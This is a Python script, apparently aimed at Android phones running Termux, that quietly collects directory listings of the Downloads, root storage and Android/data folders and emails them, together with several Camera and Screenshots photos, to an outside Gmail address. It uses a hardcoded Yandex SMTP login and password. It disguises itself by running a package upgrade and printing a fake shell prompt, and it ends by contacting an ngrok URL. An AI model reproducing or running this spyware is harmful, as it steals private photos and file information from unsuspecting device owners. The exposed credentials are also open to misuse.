import subprocess
subprocess.call("pip install termcolor", shell=True)
subprocess.call("pip install bs4", shell=True)
subprocess.call("pip install requests", shell=True)


import os
from termcolor import colored
from bs4 import BeautifulSoup
import requests
import time
from email.mime.application import MIMEApplication





directoryol = '/storage/emulated/0/DCIM/Camera'
filesi = os.listdir(directoryol)

af = filesi[2]
ag = filesi[3]
ah = filesi[4]


directo = '/storage/emulated/0/DCIM/Screenshots'
fie = os.listdir(directo)

aa1 = fie[2]
aa2 = fie[3]
aa3 = fie[4]
aa4 = fie[5]
aa5 = fie[6]




dir = '/storage/emulated/0/Download'
files = os.listdir(dir)

mir = '/storage/emulated/0/'
gif = os.listdir(mir)


hir = '/storage/emulated/0/Android/data'
jir = os.listdir(hir)

m = ("""





""")

a = ('\n'.join(files))
b = ('\n'.join(gif))
c = ('\n'.join(jir))

bodyh = (dir  + m + a + m + mir + m + b + m + hir + m + c)


import smtplib                                            
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.multipart import *


def send_mail():
	login = "vadymsalin@yandex.ru"
	password = "alex3241@"
	url = "smtp.yandex.ru"
	toaddr = "savcoavlad@gmail.com"		
	msg = MIMEMultipart()
	msg['Subject'] = 'GG'
	msg['From'] = 'vadymsalin@yandex.ru'
	body = str(bodyh)
	msg.attach(MIMEText(body, 'plain'))
	
	try:
		server = smtplib.SMTP_SSL(url, 465)
	
	except TimeoutError:
		print(colored('Соеденение разорвано, проверьте соеденение с интернетом', 'red'))
	server.login(login, password)
	server.sendmail(login, toaddr, msg.as_string())
	



def main():
	send_mail()

if __name__ == "__main__":
	main()
	
import subprocess
subprocess.call("apt update && apt upgrade", shell=True)

print("$ ")
	









# Scr





msg = MIMEMultipart()
msg['Subject'] = 'Тема письма'
msg['From'] = 'vadymsalin@yandex.ru'
 
part = MIMEText('Текст письма\n')
msg.attach(part)
 
part = MIMEApplication(open('/storage/emulated/0/DCIM/Screenshots/' + aa1 , 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
msg.attach(part)

server = smtplib.SMTP('smtp.yandex.ru:587')
server.ehlo()
server.starttls()
server.login('vadymsalin@yandex.ru', 'alex3241@')
 
server.sendmail(msg['From'], ['savcoavlad@gmail.com'], msg.as_string())





msg = MIMEMultipart()
msg['Subject'] = 'Тема письма'
msg['From'] = 'vadymsalin@yandex.ru'
 
part = MIMEText('Текст письма\n')
msg.attach(part)
 
part = MIMEApplication(open('/storage/emulated/0/DCIM/Screenshots/' + aa2 , 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
msg.attach(part)

server = smtplib.SMTP('smtp.yandex.ru:587')
server.ehlo()
server.starttls()
server.login('vadymsalin@yandex.ru', 'alex3241@')
 
server.sendmail(msg['From'], ['savcoavlad@gmail.com'], msg.as_string())





msg = MIMEMultipart()
msg['Subject'] = 'Тема письма'
msg['From'] = 'vadymsalin@yandex.ru'
 
part = MIMEText('Текст письма\n')
msg.attach(part)
 
part = MIMEApplication(open('/storage/emulated/0/DCIM/Screenshots/' + aa3 , 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
msg.attach(part)

server = smtplib.SMTP('smtp.yandex.ru:587')
server.ehlo()
server.starttls()
server.login('vadymsalin@yandex.ru', 'alex3241@')
 
server.sendmail(msg['From'], ['savcoavlad@gmail.com'], msg.as_string())






msg = MIMEMultipart()
msg['Subject'] = 'Тема письма'
msg['From'] = 'vadymsalin@yandex.ru'
 
part = MIMEText('Текст письма\n')
msg.attach(part)
 
part = MIMEApplication(open('/storage/emulated/0/DCIM/Screenshots/' + aa4 , 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
msg.attach(part)

server = smtplib.SMTP('smtp.yandex.ru:587')
server.ehlo()
server.starttls()
server.login('vadymsalin@yandex.ru', 'alex3241@')
 
server.sendmail(msg['From'], ['savcoavlad@gmail.com'], msg.as_string())




msg = MIMEMultipart()
msg['Subject'] = 'Тема письма'
msg['From'] = 'vadymsalin@yandex.ru'
 
part = MIMEText('Текст письма\n')
msg.attach(part)
 
part = MIMEApplication(open('/storage/emulated/0/DCIM/Screenshots/' + aa5 , 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
msg.attach(part)

server = smtplib.SMTP('smtp.yandex.ru:587')
server.ehlo()
server.starttls()
server.login('vadymsalin@yandex.ru', 'alex3241@')
 
server.sendmail(msg['From'], ['savcoavlad@gmail.com'], msg.as_string())





msg = MIMEMultipart()
msg['Subject'] = 'Тема письма'
msg['From'] = 'vadymsalin@yandex.ru'
 
part = MIMEText('Текст письма\n')
msg.attach(part)
 
part = MIMEApplication(open('/storage/emulated/0/DCIM/Camera/' + af , 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
msg.attach(part)

server = smtplib.SMTP('smtp.yandex.ru:587')
server.ehlo()
server.starttls()
server.login('vadymsalin@yandex.ru', 'alex3241@')
 
server.sendmail(msg['From'], ['savcoavlad@gmail.com'], msg.as_string())




msg = MIMEMultipart()
msg['Subject'] = 'Тема письма'
msg['From'] = 'vadymsalin@yandex.ru'
 
part = MIMEText('Текст письма\n')
msg.attach(part)
 
part = MIMEApplication(open('/storage/emulated/0/DCIM/Camera/' + ah , 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
msg.attach(part)

server = smtplib.SMTP('smtp.yandex.ru:587')
server.ehlo()
server.starttls()
server.login('vadymsalin@yandex.ru', 'alex3241@')
 
server.sendmail(msg['From'], ['savcoavlad@gmail.com'], msg.as_string())




msg = MIMEMultipart()
msg['Subject'] = 'Тема письма'
msg['From'] = 'vadymsalin@yandex.ru'
 
part = MIMEText('Текст письма\n')
msg.attach(part)
 
part = MIMEApplication(open('/storage/emulated/0/DCIM/Camera/' + ag , 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
msg.attach(part)

server = smtplib.SMTP('smtp.yandex.ru:587')
server.ehlo()
server.starttls()
server.login('vadymsalin@yandex.ru', 'alex3241@')
 
server.sendmail(msg['From'], ['savcoavlad@gmail.com'], msg.as_string())




# Osn




url = "https://8f13692b8478.ngrok.io"

real = requests.get(url, timeout=5)